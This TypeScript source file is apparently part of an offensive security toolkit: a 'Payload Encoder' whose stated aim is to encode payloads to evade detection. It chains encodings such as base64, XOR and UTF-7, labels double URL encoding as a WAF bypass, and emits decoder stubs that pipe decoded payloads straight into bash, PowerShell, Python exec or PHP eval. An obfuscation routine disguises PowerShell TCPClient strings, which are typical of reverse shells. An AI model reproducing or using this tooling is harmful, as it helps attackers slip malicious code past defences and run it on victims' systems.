// Payload Encoder
// Encode payloads to evade detection

import { EncodingType, EncodedPayload } from './types';

/**
 * Base64 encode a string
 */
function base64Encode(input: string): string {
    if (typeof btoa === 'function') {
        return btoa(unescape(encodeURIComponent(input)));
    }
    // Node.js fallback
    return Buffer.from(input, 'utf-8').toString('base64');
}

/**
 * Base64 decode a string
 */
function base64Decode(input: string): string {
    if (typeof atob === 'function') {
        return decodeURIComponent(escape(atob(input)));
    }
    // Node.js fallback
    return Buffer.from(input, 'base64').toString('utf-8');
}

/**
 * Hex encode a string
 */
function hexEncode(input: string): string {
    return Array.from(input)
        .map(char => char.charCodeAt(0).toString(16).padStart(2, '0'))
        .join('');
}

/**
 * Hex decode a string
 */
function hexDecode(input: string): string {
    const hex = input.replace(/\s/g, '');
    let result = '';
    for (let i = 0; i < hex.length; i += 2) {
        result += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
    }
    return result;
}

/**
 * URL encode a string
 */
function urlEncode(input: string): string {
    return encodeURIComponent(input);
}

/**
 * URL decode a string
 */
function urlDecode(input: string): string {
    return decodeURIComponent(input);
}

/**
 * Double URL encode a string
 */
function doubleUrlEncode(input: string): string {
    return encodeURIComponent(encodeURIComponent(input));
}

/**
 * Unicode encode a string (\\uXXXX format)
 */
function unicodeEncode(input: string): string {
    return Array.from(input)
        .map(char => '\\u' + char.charCodeAt(0).toString(16).padStart(4, '0'))
        .join('');
}

/**
 * Unicode decode a string
 */
function unicodeDecode(input: string): string {
    return input.replace(/\\u([0-9a-fA-F]{4})/g, (_, hex) =>
        String.fromCharCode(parseInt(hex, 16))
    );
}

/**
 * ROT13 encode/decode (symmetric)
 */
function rot13(input: string): string {
    return input.replace(/[a-zA-Z]/g, char => {
        const base = char <= 'Z' ? 65 : 97;
        return String.fromCharCode(((char.charCodeAt(0) - base + 13) % 26) + base);
    });
}

/**
 * XOR encode with a key
 */
function xorEncode(input: string, key: string = 'K'): string {
    let result = '';
    for (let i = 0; i < input.length; i++) {
        const charCode = input.charCodeAt(i) ^ key.charCodeAt(i % key.length);
        result += String.fromCharCode(charCode);
    }
    return result;
}

/**
 * HTML entity encode
 */
function htmlEncode(input: string): string {
    return Array.from(input)
        .map(char => `&#${char.charCodeAt(0)};`)
        .join('');
}

/**
 * HTML entity decode
 */
function htmlDecode(input: string): string {
    return input.replace(/&#(\d+);/g, (_, code) =>
        String.fromCharCode(parseInt(code, 10))
    );
}

/**
 * UTF-7 encode
 */
function utf7Encode(input: string): string {
    // Basic UTF-7 encoding (simplified)
    let result = '';
    let inBase64 = false;
    let buffer = '';

    for (const char of input) {
        const code = char.charCodeAt(0);
        if (code >= 0x20 && code <= 0x7E && char !== '+') {
            if (inBase64) {
                result += base64Encode(buffer).replace(/=+$/, '') + '-';
                buffer = '';
                inBase64 = false;
            }
            result += char;
        } else if (char === '+') {
            if (inBase64) {
                result += base64Encode(buffer).replace(/=+$/, '') + '-';
                buffer = '';
                inBase64 = false;
            }
            result += '+-';
        } else {
            if (!inBase64) {
                result += '+';
                inBase64 = true;
            }
            buffer += char;
        }
    }

    if (inBase64) {
        result += base64Encode(buffer).replace(/=+$/, '') + '-';
    }

    return result;
}

/**
 * UTF-16 encode (hex representation)
 */
function utf16Encode(input: string): string {
    return Array.from(input)
        .map(char => {
            const code = char.charCodeAt(0);
            const high = (code >> 8) & 0xFF;
            const low = code & 0xFF;
            return `%u${high.toString(16).padStart(2, '0')}${low.toString(16).padStart(2, '0')}`;
        })
        .join('');
}

/**
 * Encode a payload with the specified encoding
 */
export function encodePayload(
    payload: string,
    encoding: EncodingType,
    options?: { key?: string; iterations?: number }
): EncodedPayload {
    let encoded = payload;
    const iterations = options?.iterations || 1;

    for (let i = 0; i < iterations; i++) {
        switch (encoding) {
            case 'base64':
                encoded = base64Encode(encoded);
                break;
            case 'hex':
                encoded = hexEncode(encoded);
                break;
            case 'url':
                encoded = urlEncode(encoded);
                break;
            case 'double-url':
                encoded = doubleUrlEncode(encoded);
                break;
            case 'unicode':
                encoded = unicodeEncode(encoded);
                break;
            case 'rot13':
                encoded = rot13(encoded);
                break;
            case 'xor':
                encoded = xorEncode(encoded, options?.key || 'K');
                break;
            case 'html':
                encoded = htmlEncode(encoded);
                break;
            case 'utf7':
                encoded = utf7Encode(encoded);
                break;
            case 'utf16':
                encoded = utf16Encode(encoded);
                break;
            default:
                throw new Error(`Unknown encoding type: ${encoding}`);
        }
    }

    // Generate decoder stubs for common encodings
    let decoderStub: string | undefined;

    switch (encoding) {
        case 'base64':
            decoderStub = generateBase64DecoderStubs(encoded);
            break;
        case 'hex':
            decoderStub = generateHexDecoderStubs(encoded);
            break;
        case 'url':
            decoderStub = `decodeURIComponent("${encoded}")`;
            break;
    }

    return {
        original: payload,
        encoded,
        encoding,
        iterations,
        decoderStub
    };
}

/**
 * Decode a payload
 */
export function decodePayload(
    encoded: string,
    encoding: EncodingType,
    options?: { key?: string; iterations?: number }
): string {
    let decoded = encoded;
    const iterations = options?.iterations || 1;

    for (let i = 0; i < iterations; i++) {
        switch (encoding) {
            case 'base64':
                decoded = base64Decode(decoded);
                break;
            case 'hex':
                decoded = hexDecode(decoded);
                break;
            case 'url':
            case 'double-url':
                decoded = urlDecode(decoded);
                break;
            case 'unicode':
                decoded = unicodeDecode(decoded);
                break;
            case 'rot13':
                decoded = rot13(decoded); // ROT13 is symmetric
                break;
            case 'xor':
                decoded = xorEncode(decoded, options?.key || 'K'); // XOR is symmetric
                break;
            case 'html':
                decoded = htmlDecode(decoded);
                break;
            default:
                throw new Error(`Decoding not supported for: ${encoding}`);
        }
    }

    return decoded;
}

/**
 * Generate base64 decoder stubs in various languages
 */
function generateBase64DecoderStubs(encoded: string): string {
    return `# Bash
echo "${encoded}" | base64 -d | bash

# PowerShell
powershell -enc ${encoded}

# Python
import base64; exec(base64.b64decode("${encoded}"))

# PHP
<?php eval(base64_decode("${encoded}")); ?>

# Perl
perl -MMIME::Base64 -e 'print decode_base64("${encoded}")'`;
}

/**
 * Generate hex decoder stubs
 */
function generateHexDecoderStubs(encoded: string): string {
    return `# Bash
echo "${encoded}" | xxd -r -p | bash

# Python
bytes.fromhex("${encoded}").decode()

# PHP
<?php eval(hex2bin("${encoded}")); ?>`;
}

/**
 * Chain multiple encodings
 */
export function chainEncode(
    payload: string,
    encodings: EncodingType[],
    options?: { key?: string }
): EncodedPayload {
    let encoded = payload;

    for (const encoding of encodings) {
        const result = encodePayload(encoded, encoding, options);
        encoded = result.encoded;
    }

    return {
        original: payload,
        encoded,
        encoding: encodings[encodings.length - 1],
        iterations: encodings.length,
        decoderStub: `Decode in reverse order: ${encodings.slice().reverse().join(' -> ')}`
    };
}

/**
 * Generate PowerShell Base64 payload (UTF-16LE encoded)
 */
export function generatePowerShellBase64(command: string): string {
    // PowerShell expects UTF-16LE encoded Base64
    const utf16le = new Uint8Array(command.length * 2);
    for (let i = 0; i < command.length; i++) {
        const code = command.charCodeAt(i);
        utf16le[i * 2] = code & 0xFF;
        utf16le[i * 2 + 1] = (code >> 8) & 0xFF;
    }

    // Convert to base64
    let binary = '';
    for (let i = 0; i < utf16le.length; i++) {
        binary += String.fromCharCode(utf16le[i]);
    }

    return base64Encode(binary);
}

/**
 * Generate obfuscated PowerShell command
 */
export function obfuscatePowerShell(command: string): string {
    // Various obfuscation techniques
    const techniques = [
        // Tick marks
        (cmd: string) => cmd.replace(/'/g, '`\''),
        // Variable substitution
        (cmd: string) => {
            const vars: { [key: string]: string } = {
                'New-Object': '$n=New-Object;',
                'System.Net': '$s="System.Net";',
                'TCPClient': '$t="TCPClient";',
            };
            let result = '';
            for (const [search, varDef] of Object.entries(vars)) {
                if (cmd.includes(search)) {
                    result += varDef;
                }
            }
            return result + cmd;
        },
        // String concatenation
        (cmd: string) => cmd.replace(/(System\.Net\.Sockets\.TCPClient)/g, "('System.Net'+'.Sockets.TCPClient')"),
    ];

    let obfuscated = command;
    for (const technique of techniques) {
        obfuscated = technique(obfuscated);
    }

    return obfuscated;
}

/**
 * Get available encoding types with descriptions
 */
export function getEncodingTypes(): Array<{ type: EncodingType; name: string; description: string }> {
    return [
        { type: 'base64', name: 'Base64', description: 'Standard Base64 encoding' },
        { type: 'hex', name: 'Hexadecimal', description: 'Hex encoded string' },
        { type: 'url', name: 'URL Encode', description: 'URL/percent encoding' },
        { type: 'double-url', name: 'Double URL', description: 'Double URL encoding for WAF bypass' },
        { type: 'unicode', name: 'Unicode', description: 'Unicode escape sequences (\\uXXXX)' },
        { type: 'rot13', name: 'ROT13', description: 'Caesar cipher rotation' },
        { type: 'xor', name: 'XOR', description: 'XOR with custom key' },
        { type: 'html', name: 'HTML Entities', description: 'HTML decimal entities' },
        { type: 'utf7', name: 'UTF-7', description: 'UTF-7 encoding' },
        { type: 'utf16', name: 'UTF-16', description: 'UTF-16 hex encoding' }
    ];
}

export default {
    encodePayload,
    decodePayload,
    chainEncode,
    generatePowerShellBase64,
    obfuscatePowerShell,
    getEncodingTypes,
    // Export individual encoding functions
    base64Encode,
    base64Decode,
    hexEncode,
    hexDecode,
    urlEncode,
    urlDecode,
    rot13,
    xorEncode,
    htmlEncode,
    htmlDecode
};
